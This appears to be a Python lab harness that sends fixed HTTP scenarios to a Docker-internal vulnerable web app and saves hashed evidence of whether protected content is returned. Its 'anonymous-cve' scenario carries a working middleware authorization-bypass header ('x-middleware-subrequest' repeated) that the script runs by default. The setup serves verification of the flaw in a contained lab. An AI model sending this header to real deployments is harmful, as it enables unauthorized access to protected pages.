import os
import sys
import uuid
import json
import hashlib
import subprocess
from datetime import datetime, timezone
import urllib.request
import urllib.error


TARGET_BASE_URL = os.environ.get("LAB_INTERNAL_URL", "http://vulnerable:3000")

TARGET_REGISTRY = {
    "docker-internal-vulnerable": {
        "id": "docker-internal-vulnerable",
        "base_url": TARGET_BASE_URL,
        "observed_version": "14.2.24",
        "profile": "M1-FICTIONAL-RECORDS-ONLY"
    }
}

SCENARIO_REGISTRY = {
    "anonymous-normal": {
        "id": "anonymous-normal",
        "path": "/lab/vulnerable/dashboard",
        "method": "GET",
        "headers": {},
        "cookies": {},
        "expected_assertion": "denied"
    },
    "anonymous-cve": {
        "id": "anonymous-cve",
        "path": "/lab/vulnerable/dashboard",
        "method": "GET",
        "headers": {
            "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
        },
        "cookies": {},
        "expected_assertion": "protected-content-returned"
    },
    "valid-session": {
        "id": "valid-session",
        "path": "/lab/vulnerable/dashboard",
        "method": "GET",
        "headers": {},
        "cookies": {"session": "mock-signed-target-cookie"},
        "expected_assertion": "protected-content-returned"
    },
    "invalid-session": {
        "id": "invalid-session",
        "path": "/lab/vulnerable/dashboard",
        "method": "GET",
        "headers": {},
        "cookies": {"session": "invalid-token"},
        "expected_assertion": "denied"
    }
}

PROTECTED_CONTENT_MARKER = "M1-FICTIONAL-RECORDS-ONLY"
MAX_BODY_BYTES = 4096

def get_git_commit():
    try:
        commit = subprocess.check_output(["git", "rev-parse", "HEAD"], stderr=subprocess.DEVNULL).decode().strip()
        status = subprocess.check_output(["git", "status", "--porcelain"], stderr=subprocess.DEVNULL).decode().strip()
        return f"{commit}-dirty" if status else commit
    except Exception:
        return None

# Opener
class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def http_error_301(self, req, fp, code, msg, headers): return fp
    def http_error_302(self, req, fp, code, msg, headers): return fp
    def http_error_303(self, req, fp, code, msg, headers): return fp
    def http_error_307(self, req, fp, code, msg, headers): return fp
    def http_error_308(self, req, fp, code, msg, headers): return fp

def execute_scenario(target_id: str, scenario_id: str):
    if target_id not in TARGET_REGISTRY or scenario_id not in SCENARIO_REGISTRY:
        raise ValueError("Invalid target ID or scenario ID provided from fixed registry.")

    target = TARGET_REGISTRY[target_id]
    scenario = SCENARIO_REGISTRY[scenario_id]
    
    run_id = str(uuid.uuid4())
    started_at = datetime.now(timezone.utc).isoformat()
    source_commit = get_git_commit()

    url = f"{target['base_url']}{scenario['path']}"
    method = scenario['method']
    headers = dict(scenario.get('headers', {}))
    cookies = dict(scenario.get('cookies', {}))

    #cookie head
    if cookies:
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        headers["Cookie"] = cookie_str

    redacted_headers = {k: v for k, v in headers.items() if k.lower() not in ['cookie', 'authorization']}
    
    response_data = None
    observed = "error"
    error_msg = None
    elapsed_ms = 0.0

    opener = urllib.request.build_opener(NoRedirectHandler)
    req = urllib.request.Request(url, headers=headers, method=method)

    start_time = datetime.now()
    try:
        try:
            with opener.open(req, timeout=5.0) as resp:
                status_code = resp.status
                redirect_location = resp.headers.get("Location")
                raw_bytes = resp.read()
        except urllib.error.HTTPError as e:
            status_code = e.code
            redirect_location = e.headers.get("Location")
            raw_bytes = e.read()

        elapsed_ms = (datetime.now() - start_time).total_seconds() * 1000.0

        truncated = len(raw_bytes) > MAX_BODY_BYTES
        bounded_bytes = raw_bytes[:MAX_BODY_BYTES]
        escaped_body = bounded_bytes.decode('utf-8', errors='replace')

        response_data = {
            "status": status_code,
            "redirect_location": redirect_location,
            "escaped_body": escaped_body,
            "truncated": truncated
        }

        if status_code == 200:
            if PROTECTED_CONTENT_MARKER in escaped_body:
                observed = "protected-content-returned"
            else:
                observed = "conclusive"
        elif status_code in [302, 307, 308, 401, 403]:
            observed = "denied"
        else:
            observed = "conclusive"

    except Exception as e:
        elapsed_ms = (datetime.now() - start_time).total_seconds() * 1000.0
        error_msg = str(e)
        observed = "error"
        response_data = None

    evidence = {
        "schema_version": "0.1",
        "run_id": run_id,
        "started_at": started_at,
        "source_commit": source_commit,
        "target": target,
        "scenario": scenario_id,
        "expected": scenario["expected_assertion"],
        "request": {
            "method": method,
            "path": scenario["path"],
            "redacted_headers": redacted_headers
        },
        "response": response_data,
        "observed": observed,
        "elapsed_ms": round(elapsed_ms, 2),
        "error": error_msg,
        "logs": None
    }

    export_dir = os.path.join("evidence", run_id)
    os.makedirs(export_dir, exist_ok=True)
    
    json_path = os.path.join(export_dir, "result.json")
    serialized_bytes = json.dumps(evidence, indent=2, ensure_ascii=False).encode('utf-8')
    
    with open(json_path, "wb") as f:
        f.write(serialized_bytes)

    sha256_hash = hashlib.sha256(serialized_bytes).hexdigest()
    hash_path = os.path.join(export_dir, "sha256sum.txt")
    with open(hash_path, "w", encoding="utf-8") as f:
        f.write(f"{sha256_hash}  result.json\n")

    print(f"[+] Run {run_id} completed. Observed: {observed}. Evidence saved to {export_dir}")
    return evidence

if __name__ == "__main__":
    execute_scenario("docker-internal-vulnerable", "anonymous-cve")